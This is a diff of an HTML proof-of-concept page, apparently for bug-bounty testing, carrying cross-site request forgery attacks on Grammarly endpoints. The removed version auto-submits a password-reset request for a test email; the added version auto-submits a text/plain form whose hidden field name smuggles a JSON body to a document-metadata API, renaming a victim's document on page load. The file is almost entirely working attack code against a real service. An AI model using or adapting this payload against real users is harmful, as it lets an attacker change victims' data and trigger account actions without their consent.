@@ -1,12 +1,18 @@
 <!DOCTYPE html>
 <html>
+  <head>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <script>
+      $(document).ready(
+        function() {
+          $("#z").attr("name",'{"title":"csrf poc doc name changed","fakeparam":"');
+          $('#f').trigger('submit');
+      });
+    </script>
+  </head>
 <body>
-<form id="csrfForm" action="https://auth.grammarly.com/auth/v3/user/password/reset" method="POST">
-<input type="hidden" name="email" value="dummyfortest56@gmail.com">
-</form>
-
-<script>
-    document.getElementById('csrfForm').submit();
-</script>
+  <form id="f" ENCTYPE="text/plain" action="https://coda.grammarly.com/internalAppApi/documents/4OpZ_kmeUg/metadata/" method="post">
+    <input id="z" type="hidden" name='test' value='test"}'>
+  </form>
 </body>
 </html>
